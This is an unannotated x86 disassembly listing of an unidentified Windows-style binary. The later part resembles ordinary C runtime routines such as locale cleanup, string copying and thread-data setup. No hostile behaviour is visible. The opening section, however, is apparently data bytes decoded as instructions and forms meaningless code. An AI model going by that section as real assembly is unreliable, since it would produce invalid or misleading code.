  41eb41:	int    0x1
  41eb43:	push   ebx
  41eb44:	ins    DWORD PTR es:[edi],dx
  41eb45:	adc    cl,bl
  41eb47:	inc    ebp
  41eb48:	dec    esi
  41eb49:	icebp  
  41eb4a:	out    0x66,eax
  41eb4c:	lock lods al,BYTE PTR ds:[esi]
  41eb4e:	ret    0xe14b
  41eb51:	or     eax,0x428bf03a
  41eb56:	jle    0x41eb40
  41eb58:	mov    edi,0x9c62de72
  41eb5d:	mov    ebx,0x60604070
  41eb62:	mov    al,0x20
  41eb64:	dec    eax
  41eb65:	cmp    al,0x35
  41eb67:	fs pop ecx
  41eb69:	ins    BYTE PTR es:[edi],dx
  41eb6a:	mov    al,0x2a
  41eb6c:	add    eax,0x404a8450
  41eb71:	jae    0x41ebd5
  41eb73:	inc    ecx
  41eb74:	inc    eax
  41eb75:	add    BYTE PTR [eax+0x40],al
  41eb78:	inc    ecx
  41eb79:	inc    eax
  41eb7a:	bound  edx,QWORD PTR [edi-0x2b]
  41eb7d:	retf   
  41eb7e:	or     bl,al
  41eb80:	dec    ebp
  41eb81:	sub    al,0x42
  41eb83:	stos   DWORD PTR es:[edi],eax
  41eb84:	push   esi
  41eb85:	dec    edi
  41eb86:	inc    ebx
  41eb87:	test   al,0x4d
  41eb89:	or     al,0x51
  41eb8b:	stos   BYTE PTR es:[edi],al
  41eb8c:	loop   0x41eb39
  41eb8e:	sub    cl,BYTE PTR [edx]
  41eb90:	outs   dx,BYTE PTR ds:[esi]
  41eb91:	bound  eax,QWORD PTR [eax+0x40]
  41eb94:	inc    ecx
  41eb95:	add    BYTE PTR [eax+0x62],al
  41eb98:	inc    eax
  41eb99:	add    BYTE PTR [ebx+0xc],ah
  41eb9c:	(bad)  
  41eb9d:	cli    
  41eb9e:	inc    edx
  41eb9f:	inc    esi
  41eba0:	bound  esp,QWORD PTR ds:0x96fe5149
  41eba6:	dec    ebp
  41eba7:	adc    eax,0xb721245a
  41ebac:	jge    0x41ebf3
  41ebae:	cld    
  41ebaf:	jmp    0x6971b7c
  41ebb4:	mov    ah,0x62
  41ebb6:	and    eax,0x41014040
  41ebbb:	inc    eax
  41ebbc:	bound  esp,QWORD PTR [edx+0x41]
  41ebbf:	bound  edi,QWORD PTR [eax+0x2d]
  41ebc2:	loope  0x41ec15
  41ebc4:	dec    ch
  41ebc6:	test   al,0xcb
  41ebc8:	pushf  
  41ebc9:	pusha  
  41ebca:	dec    esp
  41ebcb:	inc    ecx
  41ebcc:	push   esi
  41ebcd:	push   esi
  41ebce:	adc    edi,eax
  41ebd0:	pop    es
  41ebd1:	adc    esp,DWORD PTR [ecx+0x2699c051]
  41ebd7:	ins    DWORD PTR es:[edi],dx
  41ebd8:	mov    esp,0xe5624f0f
  41ebdd:	xchg   esi,eax
  41ebde:	inc    ecx
  41ebdf:	arpl   WORD PTR [eax+0x40],ax
  41ebe2:	mov    bh,0x1
  41ebe4:	add    BYTE PTR [ecx+0x62],al
  41ebe7:	inc    eax
  41ebe8:	data16 add al,0x42
  41ebeb:	rcr    DWORD PTR ds:0x48b4dc44,1
  41ebf1:	pusha  
  41ebf2:	mov    ds:0xd3625a27,al
  41ebf7:	loope  0x41ec54
  41ebf9:	cs and al,0x94
  41ebfc:	repz lds eax,FWORD PTR [ecx]
  41ebff:	mov    ch,0xdd
  41ec01:	sub    DWORD PTR [esi+esi*1-0x65],edi
  41ec05:	push   esi
  41ec06:	inc    esp
  41ec07:	push   0x6160e2
  41ec0c:	inc    ecx
  41ec0d:	inc    eax
  41ec0e:	bound  eax,QWORD PTR [eax]
  41ec10:	inc    eax
  41ec11:	add    BYTE PTR [eax+0x62],al
  41ec14:	pop    edx
  41ec15:	adc    eax,0x2400c28d
  41ec1a:	cs sbb eax,0x5ad540d2
  41ec20:	dec    eax
  41ec21:	push   edx
  41ec22:	xor    eax,0x94dd33a2
  41ec27:	ins    BYTE PTR es:[edi],dx
  41ec28:	xor    DWORD PTR [ecx+eax*1+0x406241],ebp
  41ec2f:	add    DWORD PTR [edi+0x32324140],esi
  41ec35:	dec    ebp
  41ec36:	fwait
  41ec37:	bound  edi,QWORD PTR ds:0xfb606d61
  41ec3d:	xchg   ecx,eax
  41ec3e:	fst    st(5)
  41ec40:	inc    edi
  41ec41:	push   ds
  41ec42:	push   ebx
  41ec43:	and    eax,0x56ccb563
  41ec48:	cmp    al,0x2d
  41ec4a:	fsub   DWORD PTR [edx]
  41ec4c:	pushf  
  41ec4d:	pop    eax
  41ec4e:	push   cs
  41ec4f:	add    esi,0x61605969
  41ec55:	cmp    eax,0x5b196e7
  41ec5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec5b:	xor    al,0x89
  41ec5d:	dec    ebx
  41ec5e:	cs inc esp
  41ec60:	test   al,0xe1
  41ec62:	inc    ebx
  41ec63:	das    
  41ec64:	in     al,0x92
  41ec66:	xor    BYTE PTR [edx+0x10],ah
  41ec69:	lods   eax,DWORD PTR ds:[esi]
  41ec6a:	fisubr DWORD PTR [esi]
  41ec6c:	mul    DWORD PTR [ebx+eax*2]
  41ec6f:	int    0xbc
  41ec71:	arpl   WORD PTR fs:[esi],bp
  41ec74:	daa    
  41ec75:	add    DWORD PTR [ebx+0x74764255],edi
  41ec7b:	and    DWORD PTR [ebx],ecx
  41ec7d:	hlt    
  41ec7e:	out    0x95,eax
  41ec80:	inc    eax
  41ec81:	xor    eax,0x15212365
  41ec86:	inc    ebp
  41ec87:	sub    BYTE PTR [eax],dl
  41ec89:	mov    edi,0x59076051
  41ec8e:	push   edx
  41ec8f:	enter  0xa86b,0xc9
  41ec93:	sub    eax,0x62cad9a1
  41ec98:	ret    0xb43d
  41ec9b:	and    DWORD PTR [esi],eax
  41ec9d:	arpl   WORD PTR [esi-0x3b],dx
  41eca0:	inc    edx
  41eca1:	ret    
  41eca2:	adc    eax,0x2e572132
  41eca7:	push   ebp
  41eca8:	shr    DWORD PTR [eax+0x19502741],1
  41ecae:	and    BYTE PTR [ecx+0x2fb54467],cl
  41ecb4:	stos   DWORD PTR es:[edi],eax
  41ecb5:	icebp  
  41ecb6:	or     BYTE PTR [ebx+0x32207838],0x71
  41ecbd:	xchg   edi,eax
  41ecbe:	xchg   ebx,eax
  41ecbf:	inc    esp
  41ecc0:	xchg   edx,eax
  41ecc1:	fmul   DWORD PTR [edi+0x30]
  41ecc4:	loope  0x41ecd8
  41ecc6:	inc    ecx
  41ecc7:	bound  esp,QWORD PTR [ebp+0x62]
  41ecca:	jg     0x41ed2c
  41eccc:	sbb    cl,dl
  41ecce:	adc    edx,ebp
  41ecd0:	aad    0x43
  41ecd2:	xor    DWORD PTR [ebx],esi
  41ecd4:	loope  0x41ed2c
  41ecd6:	and    al,0x54
  41ecd8:	jecxz  0x41ec96
  41ecda:	bound  ebp,QWORD PTR [ecx]
  41ecdc:	jno    0x41ecef
  41ecde:	neg    DWORD PTR [ebp+0x28631534]
  41ece4:	and    DWORD PTR [edx+0x2c],eax
  41ece7:	mov    al,BYTE PTR [esi]
  41ece9:	imul   edx,eax,0x14
  41ecec:	aas    
  41eced:	shl    BYTE PTR [esi-0x48],1
  41ecf0:	xlat   BYTE PTR ds:[ebx]
  41ecf1:	push   eax
  41ecf2:	aad    0x61
  41ecf4:	xchg   edx,eax
  41ecf5:	add    eax,0x42f7623e
  41ecfa:	ret    0xe58d
  41ecfd:	ins    DWORD PTR es:[edi],dx
  41ecfe:	retf   0xc2cd
  41ed01:	(bad)  
  41ed02:	lds    ecx,FWORD PTR [eax+esi*2]
  41ed05:	cmp    eax,DWORD PTR [ebx+0x47]
  41ed08:	inc    eax
  41ed09:	in     al,dx
  41ed0a:	imul   eax,DWORD PTR [ecx-0x13],0x181556d
  41ed11:	push   edx
  41ed12:	cld    
  41ed13:	clc    
  41ed14:	inc    edx
  41ed15:	aas    
  41ed16:	call   0x6161:0x62a8108a
  41ed1d:	ins    DWORD PTR es:[edi],dx
  41ed1e:	scas   al,BYTE PTR es:[edi]
  41ed1f:	mov    eax,0x8d400d10
  41ed24:	push   esp
  41ed25:	aas    
  41ed26:	dec    eax
  41ed27:	bound  ebp,QWORD PTR [eax]
  41ed29:	leave  
  41ed2a:	out    dx,al
  41ed2b:	dec    ecx
  41ed2c:	loope  0x41ed9b
  41ed2e:	(bad)
  41ed31:	mov    eax,0x3f67f481
  41ed36:	dec    edi
  41ed37:	gs inc ebx
  41ed39:	or     eax,0xaf224062
  41ed3e:	or     BYTE PTR [ebp+0x4e0543df],0x32
  41ed45:	ins    DWORD PTR es:[edi],dx
  41ed46:	mov    al,BYTE PTR cs:[eax+ebp*2+0x3f11fa87]
  41ed4e:	test   eax,0x4708c9b8
  41ed53:	pop    edi
  41ed54:	mov    eax,ds:0x4e62236d
  41ed59:	inc    ebp
  41ed5a:	or     BYTE PTR [esi-0x14],0x3f
  41ed5e:	rcl    BYTE PTR [ecx+edx*8+0x6d],cl
  41ed62:	add    BYTE PTR [eax-0x5d],0x48
  41ed66:	add    BYTE PTR [eax+0x40739889],dh
  41ed6c:	mov    ebx,0x61de043f
  41ed71:	bound  ecx,QWORD PTR [ebx+0x40]
  41ed74:	jg     0x41ede3
  41ed76:	rcl    BYTE PTR [eax+ebp*4+0x4e],cl
  41ed7a:	or     DWORD PTR [eax-0x2e25c05e],eax
  41ed80:	inc    ebp
  41ed81:	xor    eax,0x27306c9b
  41ed86:	and    ah,bl
  41ed88:	sub    bh,BYTE PTR [ebp+eiz*2+0x40]
  41ed8c:	inc    edi
  41ed8d:	pop    ss
  41ed8e:	dec    esi
  41ed8f:	push   esp
  41ed90:	dec    edx
  41ed91:	inc    esi
  41ed92:	dec    eax
  41ed93:	inc    eax
  41ed94:	mov    al,ds:0x2ab1a650
  41ed99:	bound  edx,QWORD PTR [esp+edx*2]
  41ed9c:	add    al,0x73
  41ed9e:	(bad)  
  41eda0:	inc    eax
  41eda1:	pusha  
  41eda2:	adc    eax,0x1407cb7b
  41eda7:	push   esp
  41eda8:	inc    eax
  41eda9:	inc    ebp
  41edaa:	fs inc eax
  41edac:	popa   
  41edad:	mov    al,0x80
  41edaf:	icebp  
  41edb0:	inc    eax
  41edb1:	rcr    DWORD PTR [eax+edi*8],1
  41edb4:	xor    al,0x3
  41edb6:	push   ds
  41edb7:	add    al,ch
  41edb9:	push   esp
  41edba:	pushf  
  41edbb:	add    BYTE PTR [ebx],dh
  41edbd:	mov    esi,0x45c4faaa
  41edc2:	bound  eax,QWORD PTR [eax+0x1f]
  41edc5:	ins    DWORD PTR es:[edi],dx
  41edc6:	fmul   DWORD PTR es:[edi-0x2f]
  41edca:	cli    
  41edcb:	loope  0x41ed74
  41edcd:	mov    ecx,0x264a4df8
  41edd2:	dec    edx
  41edd3:	inc    eax
  41edd4:	push   ecx
  41edd5:	ins    DWORD PTR es:[edi],dx
  41edd6:	adc    ebp,DWORD PTR [edi-0x7775717]
  41eddc:	loop   0x41ed9d
  41edde:	rcl    dh,0xb4
  41ede1:	adc    DWORD PTR [edi+0x40],eax
  41ede4:	out    dx,eax
  41ede5:	sbb    esp,DWORD PTR [ecx-0x30b79afb]
  41edeb:	inc    eax
  41edec:	push   ecx
  41eded:	mov    edi,0x41e9a16d
  41edf2:	clc    
  41edf3:	mov    edi,0xc61509ff
  41edf8:	aad    0x6f
  41edfa:	or     BYTE PTR [edi+0x6462bd51],bh
  41ee00:	jnp    0x41edba
  41ee02:	lods   eax,DWORD PTR ds:[esi]
  41ee03:	inc    eax
  41ee04:	dec    edi
  41ee06:	cmp    al,0xf8
  41ee08:	fsub   QWORD PTR [edx+eiz*2+0x40]
  41ee0c:	push   ecx
  41ee0d:	ins    DWORD PTR es:[edi],dx
  41ee0e:	push   0xbc4a3fd4
  41ee13:	inc    eax
  41ee14:	dec    DWORD PTR [ebp+0x5]
  41ee17:	adc    eax,0x7e4415ac
  41ee1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee1e:	scas   eax,DWORD PTR es:[edi]
  41ee1f:	scas   al,BYTE PTR es:[edi]
  41ee20:	jecxz  0x41ee74
  41ee22:	addr16 inc eax
  41ee24:	push   ss
  41ee25:	jno    0x41ee77
  41ee27:	rol    BYTE PTR [edi+0x0],cl
  41ee2a:	inc    BYTE PTR [eax-0x41]
  41ee2d:	outs   dx,BYTE PTR fs:[esi]
  41ee2f:	or     eax,0x40622a3d
  41ee34:	pop    edi
  41ee35:	and    DWORD PTR [eax+0x38746860],edx
  41ee3b:	inc    ebx
  41ee3c:	bound  edi,QWORD PTR [esi-0x190c0dbe]
  41ee42:	stc    
  41ee43:	inc    eax
  41ee44:	outs   dx,BYTE PTR ds:[esi]
  41ee45:	inc    esp
  41ee46:	and    eax,0x4952bcf9
  41ee4b:	rcl    BYTE PTR [edx-0x1f],1
  41ee4e:	jl     0x41ee20
  41ee50:	jnp    0x41edea
  41ee52:	sbb    BYTE PTR [edx],0x60
  41ee55:	dec    eax
  41ee56:	mov    DWORD PTR ds:0xd2b05dc,0xa8cd424f
  41ee60:	lds    ebx,FWORD PTR [edi]
  41ee62:	add    DWORD PTR [esi+0x547925d],edi
  41ee68:	dec    edi
  41ee69:	sub    DWORD PTR [eax],eax
  41ee6b:	add    BYTE PTR [eax],cl
  41ee6d:	dec    eax
  41ee6e:	add    BYTE PTR [eax],al
  41ee70:	or     BYTE PTR [edi+0x0],ah
  41ee73:	add    BYTE PTR [ecx],cl
  41ee75:	xchg   BYTE PTR [eax],al
  41ee77:	add    BYTE PTR [ecx],cl
  41ee79:	rol    BYTE PTR [eax],0x0
  41ee7c:	or     eax,esp
  41ee7e:	add    BYTE PTR [eax],al
  41ee80:	or     BYTE PTR ds:0x4a080001,cl
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	or     DWORD PTR [eax+0x1],esi
  41ee8b:	add    BYTE PTR [ecx],cl
  41ee8d:	test   al,0x1
  41ee8f:	add    BYTE PTR [eax],cl
  41ee91:	out    0x1,al
  41ee93:	add    BYTE PTR [eax],cl
  41ee95:	and    al,BYTE PTR [edx]
  41ee97:	add    BYTE PTR [eax],cl
  41ee99:	push   esp
  41ee9a:	add    al,BYTE PTR [eax]
  41ee9c:	or     DWORD PTR [eax-0x56f6fffe],ecx
  41eea2:	add    al,BYTE PTR [eax]
  41eea4:	or     dh,ah
  41eea6:	add    al,BYTE PTR [eax]
  41eea8:	or     BYTE PTR [edi],bl
  41eeaa:	add    eax,DWORD PTR [eax]
  41eeac:	or     BYTE PTR [ecx],bh
  41eeae:	add    eax,DWORD PTR [eax]
  41eeb0:	or     BYTE PTR [edi+0x3],ch
  41eeb3:	add    BYTE PTR [ecx],cl
  41eeb5:	xchg   edi,eax
  41eeb6:	add    eax,DWORD PTR [eax]
  41eeb8:	or     edi,ecx
  41eeba:	add    eax,DWORD PTR [eax]
  41eebc:	or     DWORD PTR [esp+eax*1],eax
  41eebf:	add    BYTE PTR [ecx],cl
  41eec1:	inc    edx
  41eec2:	add    al,0x0
  41eec4:	or     DWORD PTR [ebp+0x4],ebp
  41eec7:	add    BYTE PTR [ecx],cl
  41eec9:	xchg   edx,eax
  41eeca:	add    al,0x0
  41eecc:	or     BYTE PTR [ebx-0xbf6fffc],bh
  41eed2:	add    al,0x0
  41eed4:	or     DWORD PTR [edi],ebp
  41eed6:	add    eax,0x56d0900
  41eedb:	add    BYTE PTR [eax],cl
  41eedd:	mov    eax,DWORD PTR ds:0x5a90900
  41eee3:	add    BYTE PTR [eax],cl
  41eee5:	loope  0x41eeec
  41eee7:	add    BYTE PTR [eax],cl
  41eee9:	or     al,BYTE PTR [esi]
  41eeeb:	add    BYTE PTR [ecx],cl
  41eeed:	aaa    
  41eeee:	push   es
  41eeef:	add    BYTE PTR [eax],cl
  41eef1:	push   ebx
  41eef2:	push   es
  41eef3:	add    BYTE PTR [eax],cl
  41eef5:	jno    0x41eefd
  41eef7:	add    BYTE PTR [eax],cl
  41eef9:	xchg   esp,eax
  41eefa:	push   es
  41eefb:	add    BYTE PTR [ecx],cl
  41eefd:	mov    BYTE PTR [esi],0x0
  41ef00:	or     eax,esi
  41ef02:	push   es
  41ef03:	add    BYTE PTR [ecx],cl
  41ef05:	adc    al,BYTE PTR [edi]
  41ef07:	add    BYTE PTR [ecx],cl
  41ef09:	cmp    eax,DWORD PTR [edi]
  41ef0b:	add    BYTE PTR [eax],cl
  41ef0d:	gs pop es
  41ef0f:	add    BYTE PTR [eax],cl
  41ef11:	cdq    
  41ef12:	pop    es
  41ef13:	add    BYTE PTR [ecx],cl
  41ef15:	aad    0x7
  41ef17:	add    BYTE PTR [ecx],cl
  41ef19:	or     ecx,DWORD PTR [eax]
  41ef1b:	add    BYTE PTR [ecx],cl
  41ef1d:	inc    ecx
  41ef1e:	or     BYTE PTR [eax],al
  41ef20:	or     BYTE PTR [ebp+0x8],ah
  41ef23:	add    BYTE PTR [eax],cl
  41ef25:	cwde   
  41ef26:	or     BYTE PTR [eax],al
  41ef28:	or     esp,ecx
  41ef2a:	or     BYTE PTR [eax],al
  41ef2c:	or     bl,bh
  41ef2e:	or     BYTE PTR [eax],al
  41ef30:	or     BYTE PTR [edx],dh
  41ef32:	add    ah,cl
  41ef34:	int3   
  41ef35:	int3   
  41ef36:	int3   
  41ef37:	int3   
  41ef38:	int3   
  41ef39:	int3   
  41ef3a:	int3   
  41ef3b:	int3   
  41ef3c:	int3   
  41ef3d:	int3   
  41ef3e:	int3   
  41ef3f:	int3   
  41ef40:	jmp    DWORD PTR ds:0x4290e0
  41ef46:	int3   
  41ef47:	int3   
  41ef48:	int3   
  41ef49:	int3   
  41ef4a:	int3   
  41ef4b:	int3   
  41ef4c:	int3   
  41ef4d:	int3   
  41ef4e:	int3   
  41ef4f:	int3   
  41ef50:	call   0x420490
  41ef55:	jmp    0x421948
  41ef5a:	cmp    DWORD PTR ds:0x433bf4,0x0
  41ef61:	jne    0x41ef75
  41ef63:	push   0xfffffffd
  41ef65:	call   0x420f4e
  41ef6a:	pop    ecx
  41ef6b:	mov    DWORD PTR ds:0x433bf4,0x1
  41ef75:	xor    eax,eax
  41ef77:	ret    
  41ef78:	push   ebp
  41ef79:	mov    ebp,esp
  41ef7b:	push   esi
  41ef7c:	push   edi
  41ef7d:	xor    esi,esi
  41ef7f:	push   0x0
  41ef81:	push   DWORD PTR [ebp+0xc]
  41ef84:	push   DWORD PTR [ebp+0x8]
  41ef87:	call   0x421495
  41ef8c:	mov    edi,eax
  41ef8e:	add    esp,0xc
  41ef91:	test   edi,edi
  41ef93:	jne    0x41efba
  41ef95:	cmp    DWORD PTR ds:0x432788,eax
  41ef9b:	jbe    0x41efba
  41ef9d:	push   esi
  41ef9e:	call   0x422179
  41efa3:	add    esi,0x3e8
  41efa9:	pop    ecx
  41efaa:	cmp    esi,DWORD PTR ds:0x432788
  41efb0:	jbe    0x41efb5
  41efb2:	or     esi,0xffffffff
  41efb5:	cmp    esi,0xffffffff
  41efb8:	jne    0x41ef7f
  41efba:	mov    eax,edi
  41efbc:	pop    edi
  41efbd:	pop    esi
  41efbe:	pop    ebp
  41efbf:	ret    
  41efc0:	push   0x1
  41efc2:	push   0x1
  41efc4:	push   0x0
  41efc6:	call   0x421af5
  41efcb:	add    esp,0xc
  41efce:	ret    
  41efcf:	push   ebp
  41efd0:	mov    ebp,esp
  41efd2:	push   esi
  41efd3:	mov    esi,DWORD PTR [ebp+0x8]
  41efd6:	test   esi,esi
  41efd8:	je     0x41f0c8
  41efde:	mov    eax,DWORD PTR [esi+0xc]
  41efe1:	cmp    eax,DWORD PTR ds:0x43150c
  41efe7:	je     0x41eff0
  41efe9:	push   eax
  41efea:	call   0x41f0cb
  41efef:	pop    ecx
  41eff0:	mov    eax,DWORD PTR [esi+0x10]
  41eff3:	cmp    eax,DWORD PTR ds:0x431510
  41eff9:	je     0x41f002
  41effb:	push   eax
  41effc:	call   0x41f0cb
  41f001:	pop    ecx
  41f002:	mov    eax,DWORD PTR [esi+0x14]
  41f005:	cmp    eax,DWORD PTR ds:0x431514
  41f00b:	je     0x41f014
  41f00d:	push   eax
  41f00e:	call   0x41f0cb
  41f013:	pop    ecx
  41f014:	mov    eax,DWORD PTR [esi+0x18]
  41f017:	cmp    eax,DWORD PTR ds:0x431518
  41f01d:	je     0x41f026
  41f01f:	push   eax
  41f020:	call   0x41f0cb
  41f025:	pop    ecx
  41f026:	mov    eax,DWORD PTR [esi+0x1c]
  41f029:	cmp    eax,DWORD PTR ds:0x43151c
  41f02f:	je     0x41f038
  41f031:	push   eax
  41f032:	call   0x41f0cb
  41f037:	pop    ecx
  41f038:	mov    eax,DWORD PTR [esi+0x20]
  41f03b:	cmp    eax,DWORD PTR ds:0x431520
  41f041:	je     0x41f04a
  41f043:	push   eax
  41f044:	call   0x41f0cb
  41f049:	pop    ecx
  41f04a:	mov    eax,DWORD PTR [esi+0x24]
  41f04d:	cmp    eax,DWORD PTR ds:0x431524
  41f053:	je     0x41f05c
  41f055:	push   eax
  41f056:	call   0x41f0cb
  41f05b:	pop    ecx
  41f05c:	mov    eax,DWORD PTR [esi+0x38]
  41f05f:	cmp    eax,DWORD PTR ds:0x431538
  41f065:	je     0x41f06e
  41f067:	push   eax
  41f068:	call   0x41f0cb
  41f06d:	pop    ecx
  41f06e:	mov    eax,DWORD PTR [esi+0x3c]
  41f071:	cmp    eax,DWORD PTR ds:0x43153c
  41f077:	je     0x41f080
  41f079:	push   eax
  41f07a:	call   0x41f0cb
  41f07f:	pop    ecx
  41f080:	mov    eax,DWORD PTR [esi+0x40]
  41f083:	cmp    eax,DWORD PTR ds:0x431540
  41f089:	je     0x41f092
  41f08b:	push   eax
  41f08c:	call   0x41f0cb
  41f091:	pop    ecx
  41f092:	mov    eax,DWORD PTR [esi+0x44]
  41f095:	cmp    eax,DWORD PTR ds:0x431544
  41f09b:	je     0x41f0a4
  41f09d:	push   eax
  41f09e:	call   0x41f0cb
  41f0a3:	pop    ecx
  41f0a4:	mov    eax,DWORD PTR [esi+0x48]
  41f0a7:	cmp    eax,DWORD PTR ds:0x431548
  41f0ad:	je     0x41f0b6
  41f0af:	push   eax
  41f0b0:	call   0x41f0cb
  41f0b5:	pop    ecx
  41f0b6:	mov    eax,DWORD PTR [esi+0x4c]
  41f0b9:	cmp    eax,DWORD PTR ds:0x43154c
  41f0bf:	je     0x41f0c8
  41f0c1:	push   eax
  41f0c2:	call   0x41f0cb
  41f0c7:	pop    ecx
  41f0c8:	pop    esi
  41f0c9:	pop    ebp
  41f0ca:	ret    
  41f0cb:	push   ebp
  41f0cc:	mov    ebp,esp
  41f0ce:	cmp    DWORD PTR [ebp+0x8],0x0
  41f0d2:	je     0x41f101
  41f0d4:	push   DWORD PTR [ebp+0x8]
  41f0d7:	push   0x0
  41f0d9:	push   DWORD PTR ds:0x431df0
  41f0df:	call   DWORD PTR ds:0x4290c8
  41f0e5:	test   eax,eax
  41f0e7:	jne    0x41f101
  41f0e9:	push   esi
  41f0ea:	call   0x41fb32
  41f0ef:	mov    esi,eax
  41f0f1:	call   DWORD PTR ds:0x429030
  41f0f7:	push   eax
  41f0f8:	call   0x41f351
  41f0fd:	pop    ecx
  41f0fe:	mov    DWORD PTR [esi],eax
  41f100:	pop    esi
  41f101:	pop    ebp
  41f102:	ret    
  41f103:	push   ebp
  41f104:	mov    ebp,esp
  41f106:	mov    eax,DWORD PTR [ebp+0x8]
  41f109:	mov    ds:0x4327c8,eax
  41f10e:	pop    ebp
  41f10f:	ret    
  41f110:	push   ebp
  41f111:	mov    ebp,esp
  41f113:	mov    eax,DWORD PTR [ebp+0x8]
  41f116:	test   eax,eax
  41f118:	je     0x41f12c
  41f11a:	sub    eax,0x8
  41f11d:	cmp    DWORD PTR [eax],0xdddd
  41f123:	jne    0x41f12c
  41f125:	push   eax
  41f126:	call   0x41f0cb
  41f12b:	pop    ecx
  41f12c:	pop    ebp
  41f12d:	ret    
  41f12e:	push   ebp
  41f12f:	mov    ebp,esp
  41f131:	push   DWORD PTR ds:0x4327a8
  41f137:	call   DWORD PTR ds:0x429048
  41f13d:	test   eax,eax
  41f13f:	je     0x41f144
  41f141:	pop    ebp
  41f142:	jmp    eax
  41f144:	push   DWORD PTR [ebp+0x18]
  41f147:	push   DWORD PTR [ebp+0x14]
  41f14a:	push   DWORD PTR [ebp+0x10]
  41f14d:	push   DWORD PTR [ebp+0xc]
  41f150:	push   DWORD PTR [ebp+0x8]
  41f153:	call   0x41fb45
  41f158:	int3   
  41f159:	push   ebp
  41f15a:	mov    ebp,esp
  41f15c:	push   esi
  41f15d:	mov    esi,DWORD PTR [ebp+0x8]
  41f160:	test   esi,esi
  41f162:	je     0x41f174
  41f164:	mov    edx,DWORD PTR [ebp+0xc]
  41f167:	test   edx,edx
  41f169:	je     0x41f174
  41f16b:	mov    ecx,DWORD PTR [ebp+0x10]
  41f16e:	test   ecx,ecx
  41f170:	jne    0x41f188
  41f172:	mov    BYTE PTR [esi],cl
  41f174:	call   0x41fb32
  41f179:	push   0x16
  41f17b:	pop    esi
  41f17c:	mov    DWORD PTR [eax],esi
  41f17e:	call   0x422622
  41f183:	mov    eax,esi
  41f185:	pop    esi
  41f186:	pop    ebp
  41f187:	ret    
  41f188:	push   edi
  41f189:	mov    edi,esi
  41f18b:	sub    edi,ecx
  41f18d:	mov    al,BYTE PTR [ecx]
  41f18f:	mov    BYTE PTR [edi+ecx*1],al
  41f192:	inc    ecx
  41f193:	test   al,al
  41f195:	je     0x41f19a
  41f197:	dec    edx
  41f198:	jne    0x41f18d
  41f19a:	pop    edi
  41f19b:	test   edx,edx
  41f19d:	jne    0x41f1aa
  41f19f:	mov    BYTE PTR [esi],dl
  41f1a1:	call   0x41fb32
  41f1a6:	push   0x22
  41f1a8:	jmp    0x41f17b
  41f1aa:	xor    eax,eax
  41f1ac:	jmp    0x41f185
  41f1ae:	push   0x8
  41f1b0:	push   0x42d9f0
  41f1b5:	call   0x4221c0
  41f1ba:	mov    esi,DWORD PTR [ebp+0x8]
  41f1bd:	mov    DWORD PTR [esi+0x5c],0x429e20
  41f1c4:	and    DWORD PTR [esi+0x8],0x0
  41f1c8:	xor    edi,edi
  41f1ca:	inc    edi
  41f1cb:	mov    DWORD PTR [esi+0x14],edi
  41f1ce:	mov    DWORD PTR [esi+0x70],edi
  41f1d1:	push   0x43
  41f1d3:	pop    eax
  41f1d4:	mov    WORD PTR [esi+0xb8],ax
  41f1db:	mov    WORD PTR [esi+0x1be],ax
  41f1e2:	mov    DWORD PTR [esi+0x68],0x430db0
  41f1e9:	and    DWORD PTR [esi+0x3b8],0x0
  41f1f0:	push   0xd
  41f1f2:	call   0x41fabe
  41f1f7:	pop    ecx
  41f1f8:	and    DWORD PTR [ebp-0x4],0x0
  41f1fc:	mov    eax,DWORD PTR [esi+0x68]
  41f1ff:	mov    ecx,edi
  41f201:	lock xadd DWORD PTR [eax],ecx
  41f205:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f20c:	call   0x41f24f
  41f211:	push   0xc
  41f213:	call   0x41fabe
  41f218:	pop    ecx
  41f219:	mov    DWORD PTR [ebp-0x4],edi
  41f21c:	mov    eax,DWORD PTR [ebp+0xc]
  41f21f:	mov    DWORD PTR [esi+0x6c],eax
  41f222:	test   eax,eax
  41f224:	jne    0x41f22e
  41f226:	mov    eax,ds:0x430aec
  41f22b:	mov    DWORD PTR [esi+0x6c],eax
  41f22e:	push   DWORD PTR [esi+0x6c]
  41f231:	call   0x4200ab
  41f236:	pop    ecx
  41f237:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f23e:	call   0x41f258
  41f243:	call   0x422205
  41f248:	ret    
  41f249:	xor    edi,edi
  41f24b:	inc    edi
  41f24c:	mov    esi,DWORD PTR [ebp+0x8]
  41f24f:	push   0xd
  41f251:	call   0x421933
  41f256:	pop    ecx
  41f257:	ret    
  41f258:	push   0xc
  41f25a:	call   0x421933
  41f25f:	pop    ecx
  41f260:	ret    
  41f261:	push   ebp
  41f262:	mov    ebp,esp
  41f264:	push   0x0
  41f266:	push   0x0
  41f268:	push   DWORD PTR [ebp+0x8]
  41f26b:	call   0x421af5
  41f270:	add    esp,0xc
  41f273:	pop    ebp
  41f274:	ret    
  41f275:	push   esi
  41f276:	push   edi
  41f277:	mov    esi,0x42d998
  41f27c:	mov    edi,0x42d998
  41f281:	jmp    0x41f28e
  41f283:	mov    eax,DWORD PTR [esi]
  41f285:	test   eax,eax
  41f287:	je     0x41f28b
  41f289:	call   eax
  41f28b:	add    esi,0x4
  41f28e:	cmp    esi,edi
  41f290:	jb     0x41f283
  41f292:	pop    edi
  41f293:	pop    esi
  41f294:	ret    
  41f295:	push   ebp
  41f296:	mov    ebp,esp
  41f298:	push   0x4
  41f29a:	push   0x0
  41f29c:	push   DWORD PTR [ebp+0x8]
  41f29f:	push   0x0
  41f2a1:	call   0x422a22
  41f2a6:	add    esp,0x10
  41f2a9:	pop    ebp
  41f2aa:	ret    
  41f2ab:	push   0xc
  41f2ad:	push   0x42dab8
  41f2b2:	call   0x4221c0
  41f2b7:	xor    esi,esi
  41f2b9:	mov    DWORD PTR [ebp-0x1c],esi
  41f2bc:	call   0x42150f
  41f2c1:	mov    edi,eax
  41f2c3:	mov    ecx,DWORD PTR ds:0x4314f4
  41f2c9:	test   DWORD PTR [edi+0x70],ecx
  41f2cc:	je     0x41f2ea
  41f2ce:	cmp    DWORD PTR [edi+0x6c],esi
  41f2d1:	je     0x41f2ea
  41f2d3:	mov    esi,DWORD PTR [edi+0x68]
  41f2d6:	test   esi,esi
  41f2d8:	jne    0x41f2e2
  41f2da:	push   0x20
  41f2dc:	call   0x421176
  41f2e1:	pop    ecx
  41f2e2:	mov    eax,esi
  41f2e4:	call   0x422205
